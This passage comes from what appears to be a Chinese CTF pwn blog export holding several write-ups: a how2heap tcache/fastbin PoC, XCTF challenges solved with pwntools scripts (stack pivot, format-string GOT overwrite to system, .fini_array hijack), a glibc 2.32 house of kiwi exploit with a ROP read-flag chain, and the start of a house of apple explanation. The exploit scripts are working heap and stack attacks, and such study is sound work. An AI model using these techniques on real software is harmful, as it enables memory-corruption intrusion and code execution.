tcache_entry *e = (tcache_entry *) chunk2mem (chunk);  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will     detect a double free.  */  e-&gt;key = tcache;  e-&gt;next = tcache-&gt;entries[tc_idx];  tcache-&gt;entries[tc_idx] = e;  ++(tcache-&gt;counts[tc_idx]);&#125;\n\n这里的写功能还是在放入tcache的函数内完成的，可以看到其实是写了两个指针的。\n\n\n\n最后实现这样\npoc这里的poc是how2heap当中的\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;assert.h&gt;const size_t allocsize = 0x40;int main()&#123;  setbuf(stdout, NULL);  printf(    &quot;\\n&quot;    &quot;This attack is intended to have a similar effect to the unsorted_bin_attack,\\n&quot;    &quot;except it works with a small allocation size (allocsize &lt;= 0x78).\\n&quot;    &quot;The goal is to set things up so that a call to malloc(allocsize) will write\\n&quot;    &quot;a large unsigned value to the stack.\\n\\n&quot;  );  // Allocate 14 times so that we can free later.  char* ptrs[14];  size_t i;  for (i = 0; i &lt; 14; i++) &#123;    ptrs[i] = malloc(allocsize);  &#125;  printf(    &quot;First we need to free(allocsize) at least 7 times to fill the tcache.\\n&quot;    &quot;(More than 7 times works fine too.)\\n\\n&quot;  );  // Fill the tcache.  for (i = 0; i &lt; 7; i++) &#123;    free(ptrs[i]);  &#125;  char* victim = ptrs[7];  printf(    &quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\\n&quot;    &quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\\n&quot;    &quot;already full, it will go in the fastbin.\\n\\n&quot;,    victim  );  free(victim);  printf(    &quot;Next we need to free between 1 and 6 more pointers. These will also go\\n&quot;    &quot;in the fastbin. If the stack address that we want to overwrite is not zero\\n&quot;    &quot;then we need to free exactly 6 more pointers, otherwise the attack will\\n&quot;    &quot;cause a segmentation fault. But if the value on the stack is zero then\\n&quot;    &quot;a single free is sufficient.\\n\\n&quot;  );  // Fill the fastbin.  for (i = 8; i &lt; 14; i++) &#123;    free(ptrs[i]);  &#125;  // Create an array on the stack and initialize it with garbage.  size_t stack_var[6];  memset(stack_var, 0xcd, sizeof(stack_var));  printf(    &quot;The stack address that we intend to target: %p\\n&quot;    &quot;It&#x27;s current value is %p\\n&quot;,    &amp;stack_var[2],    (char*)stack_var[2]  );  printf(    &quot;Now we use a vulnerability such as a buffer overflow or a use-after-free\\n&quot;    &quot;to overwrite the next pointer at address %p\\n\\n&quot;,    victim  );  //------------VULNERABILITY-----------  // Overwrite linked list pointer in victim.  *(size_t**)victim = &amp;stack_var[0];  //------------------------------------  printf(    &quot;The next step is to malloc(allocsize) 7 times to empty the tcache.\\n\\n&quot;  );  // Empty tcache.  for (i = 0; i &lt; 7; i++) &#123;    ptrs[i] = malloc(allocsize);  &#125;  printf(    &quot;Let&#x27;s just print the contents of our array on the stack now,\\n&quot;    &quot;to show that it hasn&#x27;t been modified yet.\\n\\n&quot;  );  for (i = 0; i &lt; 6; i++) &#123;    printf(&quot;%p: %p\\n&quot;, &amp;stack_var[i], (char*)stack_var[i]);  &#125;  printf(    &quot;\\n&quot;    &quot;The next allocation triggers the stack to be overwritten. The tcache\\n&quot;    &quot;is empty, but the fastbin isn&#x27;t, so the next allocation comes from the\\n&quot;    &quot;fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\\n&quot;    &quot;Those 7 chunks are copied in reverse order into the tcache, so the stack\\n&quot;    &quot;address that we are targeting ends up being the first chunk in the tcache.\\n&quot;    &quot;It contains a pointer to the next chunk in the list, which is why a heap\\n&quot;    &quot;pointer is written to the stack.\\n&quot;    &quot;\\n&quot;    &quot;Earlier we said that the attack will also work if we free fewer than 6\\n&quot;    &quot;extra pointers to the fastbin, but only if the value on the stack is zero.\\n&quot;    &quot;That&#x27;s because the value on the stack is treated as a next pointer in the\\n&quot;    &quot;linked list and it will trigger a crash if it isn&#x27;t a valid pointer or null.\\n&quot;    &quot;\\n&quot;    &quot;The contents of our array on the stack now look like this:\\n\\n&quot;  );  malloc(allocsize);  for (i = 0; i &lt; 6; i++) &#123;    printf(&quot;%p: %p\\n&quot;, &amp;stack_var[i], (char*)stack_var[i]);  &#125;  char *q = malloc(allocsize);  printf(    &quot;\\n&quot;    &quot;Finally, if we malloc one more time then we get the stack address back: %p\\n&quot;,    q  );  assert(q == (char *)&amp;stack_var[2]);  return 0;&#125;\n\n并且在上面poc也说了，如果我们再一次malloc即可获得我们目标地址的chunk，也就是可以进行任意地址分配chunk。\n\n参考链接：https://github.com/shellphish/how2heap/blob/master/glibc_2.31/fastbin_reverse_into_tcache.c\n","categories":["pwn"],"tags":["堆利用"]},{"title":"format2","url":"/2021/12/02/format2/","content":"检查保护\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char v4; // [esp+4h] [ebp-3Ch]  int v5; // [esp+18h] [ebp-28h] BYREF  char s[30]; // [esp+1Eh] [ebp-22h] BYREF  unsigned int v7; // [esp+3Ch] [ebp-4h]  memset(s, 0, sizeof(s));  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 1, 0);  printf(&quot;Authenticate : &quot;, v4);  _isoc99_scanf(&quot;%30s&quot;, s);  memset(&amp;input, 0, 0xCu);  v5 = 0;  v7 = Base64Decode(s, &amp;v5);  if ( v7 &gt; 0xC )  &#123;    puts(&quot;Wrong Length&quot;);  &#125;  else  &#123;    memcpy(&amp;input, v5, v7);    if ( auth(v7) == 1 )      correct();  &#125;  return 0;&#125;\n\n_BOOL4 __cdecl auth(int a1)&#123;  char v2[8]; // [esp+14h] [ebp-14h] BYREF  char *s2; // [esp+1Ch] [ebp-Ch]  int v4; // [esp+20h] [ebp-8h] BYREF  memcpy(&amp;v4, &amp;input, a1);  s2 = (char *)calc_md5(v2, 12);  printf(&quot;hash : %s\\n&quot;, s2);  return strcmp(&quot;f87cd601aa7fedca99018a8be88eda34&quot;, s2) == 0;&#125;\n\nvoid __noreturn correct()&#123;  if ( input == -559038737 )  &#123;    puts(&quot;Congratulation! you are good!&quot;);    system(&quot;/bin/sh&quot;);  &#125;  exit(0);&#125;\n\n流程分析流程很简单，就是你输入30个字符然后base64decode一下，要是长度小于等于12个字符就可以进行验证，验证通过再检查input是不是和这个-559038737相等就可。但是作为pwn题应该不会让你去像web那样搞这个md5，这道题的漏洞发生在auth里面的复制这个v4会造成栈溢出\n利用分析但是受限于题目输入字符的限制我们只能输入12个有效字符，也就是刚刚覆盖到ebp那个位置就没法继续往后覆盖了。但是这个input是一个全局变量所以考虑栈迁移。直接贴exp了，理解起来很简单\nfrom pwn import *import base64elf = ELF(&#x27;./format2&#x27;)# r = process(&#x27;./format2&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 51941)shell_addr = 0x08049284input_addr = 0x0811EB40r.recvuntil(b&#x27;Authenticate : &#x27;)payload = b&#x27;a&#x27;*0x4 + p32(shell_addr) + p32(input_addr)payload = base64.b64encode(payload)r.sendline(payload)r.interactive()\n\n","categories":["pwn-xctf"],"tags":["栈迁移"]},{"title":"forgot","url":"/2021/10/18/forgot/","content":"检查程序\n32位，只开了栈不可执行的保护。\n反汇编int __cdecl main()&#123;  size_t v0; // ebx  char v2[32]; // [esp+10h] [ebp-74h] BYREF  _DWORD v3[10]; // [esp+30h] [ebp-54h]  char s[32]; // [esp+58h] [ebp-2Ch] BYREF  int v5; // [esp+78h] [ebp-Ch]  size_t i; // [esp+7Ch] [ebp-8h]  v5 = 1;  v3[0] = sub_8048604;  v3[1] = sub_8048618;  v3[2] = sub_804862C;  v3[3] = sub_8048640;  v3[4] = sub_8048654;  v3[5] = sub_8048668;  v3[6] = sub_804867C;  v3[7] = sub_8048690;  v3[8] = sub_80486A4;  v3[9] = sub_80486B8;  puts(&quot;What is your name?&quot;);  printf(&quot;&gt; &quot;);  fflush(stdout);  fgets(s, 0x20, stdin);  sub_80485DD(s);  fflush(stdout);  printf(&quot;I should give you a pointer perhaps. Here: %x\\n\\n&quot;, sub_8048654);  fflush(stdout);  puts(&quot;Enter the string to be validate&quot;);  printf(&quot;&gt; &quot;);  fflush(stdout);  __isoc99_scanf(&quot;%s&quot;, v2);  for ( i = 0; ; ++i )  &#123;    v0 = i;    if ( v0 &gt;= strlen(v2) )      break;    switch ( v5 )    &#123;      case 1:        if ( sub_8048702(v2[i]) )          v5 = 2;        break;      case 2:        if ( v2[i] == 64 )          v5 = 3;        break;      case 3:        if ( sub_804874C(v2[i]) )          v5 = 4;        break;      case 4:        if ( v2[i] == 46 )          v5 = 5;        break;      case 5:        if ( sub_8048784(v2[i]) )          v5 = 6;        break;      case 6:        if ( sub_8048784(v2[i]) )          v5 = 7;        break;      case 7:        if ( sub_8048784(v2[i]) )          v5 = 8;        break;      case 8:        if ( sub_8048784(v2[i]) )          v5 = 9;        break;      case 9:        v5 = 10;        break;      default:        continue;    &#125;  &#125;  (v3[--v5])();  return fflush(stdout);&#125;\n\n内部的其他函数基本就是这样一个判断\n_BOOL4 __cdecl sub_8048702(char a1)&#123;  return a1 &gt; 96 &amp;&amp; a1 &lt;= 122 || a1 &gt; 47 &amp;&amp; a1 &lt;= 57 || a1 == 95 || a1 == 45 || a1 == 43 || a1 == 46;&#125;\n\n还有一个已经被我改名字的函数可以直接拿到flag\nint get_flag()&#123;  char s[58]; // [esp+1Eh] [ebp-3Ah] BYREF  snprintf(s, 0x32u, &quot;cat %s&quot;, &quot;./flag&quot;);  return system(s);&#125;\n\n代码审计程序存在两处栈溢出\nfgets(s, 0x20, stdin);  // 第一处sub_80485DD(s);fflush(stdout);printf(&quot;I should give you a pointer perhaps. Here: %x\\n\\n&quot;, sub_8048654);fflush(stdout);puts(&quot;Enter the string to be validate&quot;);printf(&quot;&gt; &quot;);fflush(stdout);__isoc99_scanf(&quot;%s&quot;, v2);  // 第二处\n\n看完代码逻辑，第一处没什么用，整个程序的意思也就是，输入一串字符，然后在遍历字符，如果字符满足就改变v5但是最终程序执行\n(v3[--v5])();这个，思路很明确，让v3[0]=get_flag_addr然后让v5=1，v5本来就等于所以只需要都return false就行\nexpfrom pwn import *\n\ncontext(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)\n\nelf = ELF(&#39;./questions/d033ab68b3e64913a1b6b1029ef3dc29&#39;)\nr = remote(&#39;111.200.241.244&#39;, 56210)\n\nflag_addr = 0x80486cc\npayload = b&#39;A&#39;*(0x20)+p32(flag_addr)\nr.recvuntil(b&#39;What is your name?\\n&#39;)\nr.sendlineafter(b&#39;&gt;&#39;, &#39;1&#39;)\nr.sendlineafter(b&#39;Enter the string to be validate&#39;, payload)\n\nr.interactive()\n\n","categories":["pwn-xctf"],"tags":["stack-overflow"]},{"title":"glibc2.32的堆风水+house of kiwi实例","url":"/2022/05/13/glibc2-32%E7%9A%84%E5%A0%86%E9%A3%8E%E6%B0%B4-house-of-kiwi%E5%AE%9E%E4%BE%8B/","content":"看我前面的文章可以发现我在做漏洞利用的总结主要是在glibc2.31以下版本的，这也就导致了在后续版本的glibc的利用方式我也没怎么掌握，后续打算将house of kiwi以及house of Emma写完之后会关注一下glibc2.31之后的how2heap的poc，如果存在差异就会写文章记录。\n在学校的一次比赛当中我出了一道题，是glibc2.23版本的，当时的解题关键就是off by null进行多个堆合并，利用方式较为简单。但是就目前的glibc2.32中consolidate的条件是比较苛刻的，因此出现了新的堆风水的方式了(这篇文章也是把以前的坑填了)。\n隔块堆合并手法首先还是先看源码\nif (!prev_inuse(p)) &#123;    prevsize = prev_size (p);    size += prevsize;    p = chunk_at_offset(p, -((long) prevsize));    if (__glibc_unlikely (chunksize(p) != prevsize))        malloc_printerr (&quot;corrupted size vs. prev_size while consolidating&quot;);    unlink_chunk (av, p);&#125;\n\nstatic voidunlink_chunk (mstate av, mchunkptr p)&#123;  if (chunksize (p) != prev_size (next_chunk (p)))    malloc_printerr (&quot;corrupted size vs. prev_size&quot;);  mchunkptr fd = p-&gt;fd;  mchunkptr bk = p-&gt;bk;  if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))    malloc_printerr (&quot;corrupted double-linked list&quot;);  fd-&gt;bk = bk;  bk-&gt;fd = fd;  if (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != NULL)    &#123;      if (p-&gt;fd_nextsize-&gt;bk_nextsize != p\t  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)\tmalloc_printerr (&quot;corrupted double-linked list (not small)&quot;);      if (fd-&gt;fd_nextsize == NULL)\t&#123;\t  if (p-&gt;fd_nextsize == p)\t    fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;\t  else\t    &#123;\t      fd-&gt;fd_nextsize = p-&gt;fd_nextsize;\t      fd-&gt;bk_nextsize = p-&gt;bk_nextsize;\t      p-&gt;fd_nextsize-&gt;bk_nextsize = fd;\t      p-&gt;bk_nextsize-&gt;fd_nextsize = fd;\t    &#125;\t&#125;      else\t&#123;\t  p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;\t  p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;\t&#125;    &#125;&#125;\n\n可以看到这里是验证了p位，如果为0那么就检测前一个chunk的size是否等于当前chunk的size，那么就不能单纯的像以前那样利用了，我们还需要伪造前一个chunk的size了，这里需要用到large bin的机制了。\n利用方式既然我们只能进行off by null还需要堆合并，那我们就需要满足上面代码的两项要求，第一就是常规的chunk-&gt;fd-&gt;bk指向本身，其次就是size==prev_size\n\n此时取出size:0x510，由于残留指针，所以还是存在以下的指向关系\n\n并且此时在fd，bk位置伪造prev_size和size，那么我们在下面off by null的时候计算出prev_size即可绕过对于size的检查了。但是此时又出现了一个问题，fake_chunk的fd的bk以及fake_chunk的bk的fd并不指向它本身。那么现在取出size:0x500的chunk，直接覆盖掉其fd指针，使他指向size:0x510，然后large bin当中只剩下一个size:0x520，它的fd和bk都指向了large bin了，所以我们此时需要再free一个size为0x500的chunk，然后把size:0x520取出来进行覆盖，那么即可绕过consolidate时的验证了。\nNULL_FXCK基本流程这道题同样是菜单题，但是不同的是在每次选择的时候会验证__malloc_hook和__free_hook以及会清除掉tcache的count。\n然后唯一的漏洞点是modify函数，存在一个off by null但是只能执行一次。并且在delete函数会清空指针。\n思路因为只有一次off by null的机会，所以我们能够利用的方式就是上面的堆合并技巧，但是这里的create函数在写入数据的时候总是会把结尾改为\\x00并且最小的chunk为0x110所以我们无法直接覆盖内容了，需要利用partial overwrite并且这里的partial overwrite还需要注意一下。我们需要让size:0x510的chunk的地址形式为：0xAAAAAAAAAAAA00AA\n\n形成这样的堆叠，接着申请回来并覆盖值\n\n当然这里由于partial overwrite的缘故第一位是否为0是需要一定概率的(上面的0x1000是因为我还没有计算大小，后续会调整)。\n\n可以看到这里就实现了consolidate。\n下面就是泄漏地址了，首先先泄漏堆地址，因为泄漏起来较为简单，在我们consolidate之前我们所显示的堆地址都是以\\x00结尾导致无法泄漏，但是在consolidate之后存在以下代码\nunlink_chunk (mstate av, mchunkptr p)&#123;  if (chunksize (p) != prev_size (next_chunk (p)))    malloc_printerr (&quot;corrupted size vs. prev_size&quot;);  mchunkptr fd = p-&gt;fd;  mchunkptr bk = p-&gt;bk;  if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))    malloc_printerr (&quot;corrupted double-linked list&quot;);  fd-&gt;bk = bk;  bk-&gt;fd = fd;  ... ...\n\n导致堆地址写在了其他索引的chunk当中，所以可以非常轻松的泄漏出来，不过这里的main_arena+96非常恶心，结尾是\\x00有因为是strlen计算大小打印就导致泄漏不出来，但是这里使用的方法可以继续延续在unsorted bin当中的思路进行切割，但是下一步就是申请大chunk将我们consolidate的chunk放到largin bin当中。\n后面也就是实现任意地址写了，首先想到的肯定就是tcache，虽然题目看起来是没有办法对tcache进行攻击的但是tcache这个结构体也只是因为tls结构存放的指针才起的作用，所以我们可以通过large bin attack来修改tls结构当中的指针，然后在堆块中布置好地址，最后修改地址进行fsop。这里采取的方式就是以前写过的house of kiwi不过以前写的比较匆忙也没有加以实践，可能看起来就会晕头晕脑的，所以这里还是从源码层面分析一边接着放出exp应该会好点。\nhouse of kiwi先来说一下为什么不能用house of系列中的其他方式，因为这道题的退出函数是_exit然而其他的要求是exit退出或者正常main退出，所以这里只能寻找其他攻击链。\nstatic void__malloc_assert (const char *assertion, const char *file, unsigned int line,\t\t const char *function)&#123;  (void) __fxprintf (NULL, &quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\\n&quot;,\t\t     __progname, __progname[0] ? &quot;: &quot; : &quot;&quot;,\t\t     file, line,\t\t     function ? function : &quot;&quot;, function ? &quot;: &quot; : &quot;&quot;,\t\t     assertion);  fflush (stderr);  abort ();&#125;\n\n当assert触发时会调用这一函数，中间调用了fflush\nint_IO_fflush (FILE *fp)&#123;  if (fp == NULL)    return _IO_flush_all ();  else    &#123;      int result;      CHECK_FILE (fp, EOF);      _IO_acquire_lock (fp);      result = _IO_SYNC (fp) ? EOF : 0;      _IO_release_lock (fp);      return result;    &#125;&#125;\n\n\n通过调试也可以看到调用关系\n\n并且这里是可读可写的，所以后续就好办了。\nexpfrom pwn import *elf = ELF(&#x27;./main&#x27;)libc = ELF(&#x27;./libc-2.32.so&#x27;)# context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]context.arch = &#x27;amd64&#x27;def create(size, content=None):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;(: Size:&#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Content:&#x27;)    if content is None:        r.send(b&#x27;\\n&#x27;)    else:        r.send(content)def edit(idx, content):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Index:&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Content:&#x27;)    r.send(content)def delete(idx):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Index:&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))def show(idx):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))while 1:    r = process(&#x27;./main&#x27;)    try:        # r = process(&#x27;./main&#x27;)        create(0x2000)        create(0x2000)        create(0xd20)        create(0x500)  #3        create(0x4f0)  #4        create(0x4f0)        create(0x100)        create(0x510)        create(0x100)        create(0x500)        create(0x108)  #10        create(0x4f0)        create(0x100)        delete(7)        create(0x1000)        delete(7)        delete(5)        create(0x1000)        delete(5)        delete(3)        create(0x1000)        delete(3)        create(0x500, flat(0, 0x1c60 + 1))  #3        create(0x4f0, b&#x27;\\x00&#x27; * 8 + b&#x27;\\x10\\n&#x27;)  #5        delete(4)        create(0x1000)        delete(4)        create(0x510, b&#x27;\\x10\\n&#x27;)  #4        create(0x4f0)  #7---4        edit(10, b&#x27;\\x00&#x27; * 0x100 + p64(0x1c60))        delete(11)        show(4)        context.log_level = &#x27;debug&#x27;        heap_base = u64(            r.recvuntil(b&#x27;1. Create&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;)) - 0x5a10        print(hex(heap_base))        create(0x4f0)  #11        create(0x2000)  #13        delete(13)        show(7)        libc_base = u64(            r.recvuntil(b&#x27;1. Create&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;)) - 0x1e4280        print(hex(libc_base))        tls_tcache = libc_base + 0x1eb578        _IO_file_jumps_addr = libc_base + 0x1e54c0        _IO_file_jumps_SYNC_addr = _IO_file_jumps_addr + 0x60        fake_tcache = b&#x27;\\x00&#x27; * (0x7C - 0x10)        fake_tcache += p16(1)        fake_tcache += p16(1)        fake_tcache = fake_tcache.ljust(0x270 - 0x10, b&#x27;\\x00&#x27;)        fake_tcache += p64(_IO_file_jumps_SYNC_addr)        fake_tcache += p64(libc_base + 0x1e48c0)        payload = fake_tcache        create(0x4f0, payload)  #13        delete(4)        create(0x2000)        delete(4)        payload = b&#x27;a&#x27; * 0x600 + flat(0, 0x521, libc_base + 0x1e4030, libc_base                                      + 0x1e4030, 0, tls_tcache - 0x20)        create(0x600 + 0x30, payload)        delete(7)        create(0x2000)        delete(7)        create(0x4f0, fake_tcache)        pop_rdi = libc_base + next(libc.search(asm(&#x27;pop rdi\\nret&#x27;)))        pop_rsi = libc_base + next(libc.search(asm(&#x27;pop rsi\\nret&#x27;)))        pop_rdx = libc_base + next(libc.search(asm(&#x27;pop rdx\\nret&#x27;)))        pop_rax = libc_base + next(libc.search(asm(&#x27;pop rax\\nret&#x27;)))        syscall = libc_base + next(libc.search(asm(&#x27;syscall\\nret&#x27;)))        ret = libc_base + next(libc.search(asm(&#x27;ret&#x27;)))        heap_addr = heap_base + 0x7298        payload = b&#x27;/flag\\x00\\x00\\x00&#x27;        payload += flat(pop_rdi, heap_addr - 0x8, pop_rsi, 0, pop_rdx, 0,                        pop_rax, 2, syscall)        payload += flat(pop_rdi, 3, pop_rsi, libc_base + libc.bss(), pop_rdx,                        0x100, pop_rax, 0, syscall)        payload += flat(pop_rdi, 1, pop_rsi, libc_base + libc.bss(), pop_rdx,                        0x100, pop_rax, 1, syscall)        create(0x1200, payload)        create(0x590, fake_tcache[48:])        payload = b&#x27;\\x00&#x27; * 0xa0 + p64(heap_addr) + p64(ret)        create(0x400, payload)        create(0x3f0, p64(libc.symbols[&#x27;setcontext&#x27;] + 61 + libc_base))        delete(15)        # delete(9)        create(            0xb40, b&#x27;\\x00&#x27; * 0xb08 +            flat(0x521 | 4, libc_base + 0x1e4030, libc_base + 0x1e4030,                 heap_base + 0x6020, heap_base + 0x6020))        create(0x610, b&#x27;\\x00&#x27; * 0x608 + p64(0x500 | 4))        create(0x510)        r.recvuntil(b&#x27;&gt;&gt; &#x27;)        r.sendline(b&#x27;1&#x27;)        r.recvuntil(b&#x27;(: Size:&#x27;)        r.sendline(bytes(str(0x2000), encoding=&#x27;utf-8&#x27;))        # gdb.attach(r)        # pause()        context.log_level = &#x27;debug&#x27;    except:        r.close()r.interactive()\n\n在前面chunk布局的时候最好多放点chunk，不然就跟我一样后续加很麻烦。\n\n参考文章：\nhttps://www.anquanke.com/post/id/235598\n","categories":["pwn"],"tags":["HeapFengShui","house of 系列"]},{"title":"greeting-150","url":"/2021/10/21/greeting-150/","content":"检查保护\n三十二位，开启了Canary\n\n执行结果是这样，猜测可能有格式化字符串\n执行流程分析int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char s[64]; // [esp+1Ch] [ebp-84h] BYREF  char v5[64]; // [esp+5Ch] [ebp-44h] BYREF  unsigned int v6; // [esp+9Ch] [ebp-4h]  v6 = __readgsdword(0x14u);  printf(&quot;Please tell me your name... &quot;);  if ( !getnline(v5, 64) )    return puts(&quot;Don&#x27;t ignore me ;( &quot;);  sprintf(s, &quot;Nice to meet you, %s :)\\n&quot;, v5);  return printf(s);&#125;\n\n这个getnline是真的长得像libc自带的\nsize_t __cdecl getnline(char *s, int n)&#123;  char *v3; // [esp+1Ch] [ebp-Ch]  fgets(s, n, stdin);  v3 = strchr(s, 10);  if ( v3 )    *v3 = 0;  return strlen(s);&#125;\n\n整体流程就是输入一段字符，然后把字符复制给s然后打印出s，s那里存在明显的格式化字符串漏洞，输入aaaaaa_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p\n\n上面是栈内的情况    \n\n打印的结果，可以看到偏移量是12。而且在getnline函数里面的strlen的调用方式和system一模一样，所以篡改strlen的got表地址到system就可以直接执行了。但是目前还有一个问题就是程序是只存在一处漏洞，并且执行完了就没了，然后思路就断了，看了wp知道：\nmain在执行之前会调用.init段的代码和.init_array段的函数数组的每一个指针，在main执行结束后会调用，.fini段代码和.fini_array段的函数数组的每一个指针\n函数利用过程首先修改strlen的got表为system的plt表，那么调用strlen的时候就是就调用了system，然后修改.fini_array的段指针到main函数，然后就等main执行完之后就会重新进入main在调用getnline的时候输入/bin/sh就可以调用到system(‘/bin/sh’)了，就getshell了。\n.fini_array:08049934 ; ELF Termination Function Table.fini_array:08049934 ; ===========================================================================.fini_array:08049934.fini_array:08049934 ; Segment type: Pure data.fini_array:08049934 ; Segment permissions: Read/Write.fini_array:08049934 _fini_array     segment dword public &#x27;DATA&#x27; use32.fini_array:08049934                 assume cs:_fini_array.fini_array:08049934                 ;org 8049934h.fini_array:08049934 __do_global_dtors_aux_fini_array_entry dd offset __do_global_dtors_aux.fini_array:08049934                                         ; DATA XREF: __libc_csu_init+18↑o.fini_array:08049934 _fini_array     ends                    ; Alternative name is &#x27;__init_array_end&#x27;.fini_array:08049934\n\n上面调用的是 __do_global_dtors_aux函数\n.text:080485A0 __do_global_dtors_aux proc near         ; DATA XREF: .fini_array:__do_global_dtors_aux_fini_array_entry↓o.text:080485A0                 cmp     ds:completed_6591, 0.text:080485A7                 jnz     short locret_80485BC.text:080485A9                 push    ebp.text:080485AA                 mov     ebp, esp.text:080485AC                 sub     esp, 8.text:080485AF                 call    deregister_tm_clones.text:080485B4                 mov     ds:completed_6591, 1.text:080485BB                 leave.text:080485BC.text:080485BC locret_80485BC:                         ; CODE XREF: __do_global_dtors_aux+7↑j.text:080485BC                 rep retn\n\n函数的地址是0x080485A0，main函数的地址是0x080485ED发现只有后面四个字节不一样，所以修改后面四个字节就可了。\n解题exp:\nfrom pwn import *\n\nelf = ELF(&#39;./questions/1330703b472c4eaab999ffc141717c64&#39;)\n# r = remote(&#39;111.200.241.244&#39;, 55046)\nr = process(&#39;./questions/1330703b472c4eaab999ffc141717c64&#39;)\n\n_fini_array = 0x8049934\nmain_addr = 0x85ED\nstrlen_got_addr = elf.got[&#39;strlen&#39;]\nsystem_plt_addr = 0x8048490\n\npayload = b&#39;aa&#39;+p32(strlen_got_addr)+p32(strlen_got_addr+2)+p32(_fini_array) + \\\n    b&#39;%&#39;+bytes(str(0x804-0x20), encoding=&#39;utf8&#39;)+b&#39;c%13$hn&#39;+b&#39;%&#39;+bytes(str(0x8490-0x804), encoding=&#39;utf8&#39;) + \\\n    b&#39;c%12$hn&#39;+b&#39;%&#39;+bytes(str(0x85ed-0x8490), encoding=&#39;utf8&#39;)+b&#39;c%14$hn&#39;\nr.recvuntil(b&#39;Please tell me your name... &#39;)\nr.sendline(payload)\n\nr.recvuntil(b&#39;Please tell me your name... &#39;)\nr.sendline(&#39;/bin/sh&#39;)\n\nr.interactive()\n\n","categories":["pwn-xctf"],"tags":["格式化字符串"]},{"title":"house of apple","url":"/2022/07/26/house-of-apple/","content":"简单介绍在高版本中large bin attack算是为数不多的可以任意地址写堆地址的方法。\n这一利用方式是相较于其他house of 系列来说存在一定差异，它不是直接通过IO_FILE getshell是通过扩大现存的写堆地址漏洞的方式，从而辅佐其他house of 系列。\n利用条件\n程序从main函数返回或能调用exit函数\n能泄露出heap地址和libc地址\n能使用一次largebin attack\n\n利用原理调用链和house of pig一致：\nexit=&gt;fcloseall=&gt;_IO_cleanup=&gt;_IO_flush_all_lockp=&gt;_IO_OVERFLOW\n首先在vtbale中存在这样一个函数：\nstatic wint_t_IO_wstrn_overflow (FILE *fp, wint_t c)&#123;  /* When we come to here this means the user supplied buffer is     filled.  But since we must return the number of characters which     would have been written in total we must provide a buffer for     further use.  We can do this by writing on and on in the overflow     buffer in the _IO_wstrnfile structure.  */  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;   if (fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf)    &#123;      _IO_wsetb (fp, snf-&gt;overflow_buf,         snf-&gt;overflow_buf + (sizeof (snf-&gt;overflow_buf)                      / sizeof (wchar_t)), 0);       fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;      fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;      fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;overflow_buf;      fp-&gt;_wide_data-&gt;_IO_read_end = (snf-&gt;overflow_buf                      + (sizeof (snf-&gt;overflow_buf)                     / sizeof (wchar_t)));    &#125;   fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf;  fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf;   /* Since we are not really interested in storing the characters     which do not fit in the buffer we simply ignore it.  */  return c;&#125;\n\n首先是将fp转化为_IO_wstrnfile结构体\ntypedef struct&#123;  _IO_strfile f;  /* This is used for the characters which do not fit in the buffer     provided by the user.  */  wchar_t overflow_buf[64];&#125; _IO_wstrnfile;\n\n根据上面，如果通过fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf判断则会对fp-&gt;_wide_data的_IO_write_base、_IO_read_base、_IO_read_ptr和_IO_read_end赋值为snf-&gt;overflow_buf或者与该地址一定范围内偏移的值，最后对fp-&gt;_wide_data的_IO_write_ptr和_IO_write_end赋值。\n只要控制了fp-&gt;_wide_data，就可以控制从fp-&gt;_wide_data开始一定范围内的内存的值，也就等同于任意地址写已知地址\n不过可以看到在赋值之前会路过这一函数：\nvoid_IO_wsetb (FILE *f, wchar_t *b, wchar_t *eb, int a)&#123;  if (f-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))    free (f-&gt;_wide_data-&gt;_IO_buf_base);  f-&gt;_wide_data-&gt;_IO_buf_base = b;  